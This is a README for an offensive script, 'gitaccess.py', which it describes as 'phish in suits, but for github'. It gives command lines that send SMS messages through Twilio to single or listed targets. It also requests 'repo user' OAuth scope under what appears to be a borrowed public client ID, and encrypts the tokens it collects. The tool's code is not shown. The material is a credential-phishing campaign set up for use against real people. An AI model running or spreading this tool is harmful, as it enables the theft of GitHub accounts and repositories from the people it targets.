phish in suits, but for github


usage: 
single user
```
python3 gitaccess.py \
  --client_id "178c6fc778ccc68e1d6a" \
  --twl_sid "twilio sid" \
  --twl_token "twilio token" \
  --from_phone "sender phone number with area code" \
  --tgt_email "user@example.com" \
  --tgt_phone "target phone number with area code" \
  --encryption_key "your 32bit encryption key" \
  --scope "repo user"

```

multi user

```
python3 gitaccess.py \
  --client_id "178c6fc778ccc68e1d6a" \
  --twl_sid "twilio sid" \
  --twl_token "twilio token" \
  --from_phone "sender phone number with area code" \
  --encryption_key "32bit encryption key" \
  -f users.txt
```


expected file format: 

`users.txt`

```
user1@example.com,+10123456789
user2@example.com,+19876543210
```
